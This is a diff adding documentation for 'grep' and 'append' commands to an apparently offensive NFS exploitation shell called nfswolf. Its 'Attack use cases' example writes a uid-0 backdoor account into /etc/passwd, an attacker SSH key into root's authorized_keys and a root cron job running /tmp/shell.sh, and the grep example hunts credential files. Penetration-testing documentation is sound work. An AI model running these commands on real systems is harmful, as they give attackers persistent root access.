@@ -54,6 +54,33 @@ Recursive case-insensitive filename search from the current directory.
 find <pattern>
 ```
 
+### grep
+
+Search remote file contents over NFS. Reads files via NFS READ RPCs and matches lines containing the pattern. Binary files (detected by null bytes in the first 512 bytes) are skipped automatically.
+
+```
+grep [-r] [-i] [-n] <pattern> <path>
+```
+
+| Flag | Description |
+|------|-------------|
+| `-r` | Recurse into subdirectories |
+| `-i` | Case-insensitive matching |
+| `-n` | Show line numbers |
+
+When `path` is a regular file, searches that file. When `path` is a directory, searches all regular files in that directory. With `-r`, descends into subdirectories recursively. Path defaults to the current directory if omitted.
+
+??? example "Example"
+    ```
+    nfswolf> grep -rni password /etc
+    /etc/login.defs:63:# PASS_MAX_DAYS   Maximum number of days a password may be used.
+    /etc/pam.d/common-password:25:password requisite pam_pwquality.so retry=3
+    /etc/ssh/sshd_config:58:PasswordAuthentication yes
+
+    nfswolf> grep root /etc/passwd
+    /etc/passwd:root:x:0:0:root:/root:/bin/bash
+    ```
+
 ## File operations
 
 ### cat
@@ -135,6 +162,35 @@ Copy a remote file (READ + CREATE + WRITE). Source permissions are preserved. **
 ```
 cp <src> <dst>
 ```
+
+### append :material-pencil:
+
+Append data to an existing remote file. Writes at the file's current EOF offset without overwriting existing contents.
+
+```
+append <file> <text|0xHEX>
+```
+
+Two data formats are supported:
+
+| Format | Syntax | Example |
+|--------|--------|---------|
+| Text with escapes | Plain string (quote if it contains spaces) | `append /tmp/hosts "10.0.0.1 target\n"` |
+| Hex bytes | `0x` prefix followed by hex pairs | `append /tmp/test 0x48656c6c6f` |
+
+Text data supports echo-style escape sequences: `\n` (newline), `\t` (tab), `\r` (carriage return), `\\` (backslash), `\0` (null byte), `\a` (bell), `\b` (backspace). Surrounding double quotes are stripped if present.
+
+??? example "Attack use cases"
+    ```
+    nfswolf> append /etc/passwd "backdoor:x:0:0::/root:/bin/bash\n"
+    appended 33 bytes (new size: 1237)
+
+    nfswolf> append /root/.ssh/authorized_keys "ssh-ed25519 AAAA... attacker\n"
+    appended 82 bytes (new size: 663)
+
+    nfswolf> append /etc/crontab "* * * * * root /tmp/shell.sh\n"
+    appended 30 bytes (new size: 892)
+    ```
 
 ## Links
 
@@ -375,6 +431,8 @@ These commands operate on the local (attacker's) machine, not the remote NFS exp
 | Command | NFSv2 | NFSv3 | NFSv4 | Notes |
 |---------|:-----:|:-----:|:-----:|-------|
 | All base commands | Yes | Yes | Yes | Shared via `ShellOps` trait |
+| `append` | Yes | Yes | Yes | Writes at existing EOF offset |
+| `grep` | Yes | Yes | Yes | Content search via READ RPCs |
 | `mknod` | -- | Yes | Yes | NFSv2 has no MKNOD procedure |
 | `root` | Yes | -- | -- | NFSPROC_ROOT is NFSv2 only |
 | `verifier` | -- | Yes | -- | COMMIT writeverf is NFSv3 only |
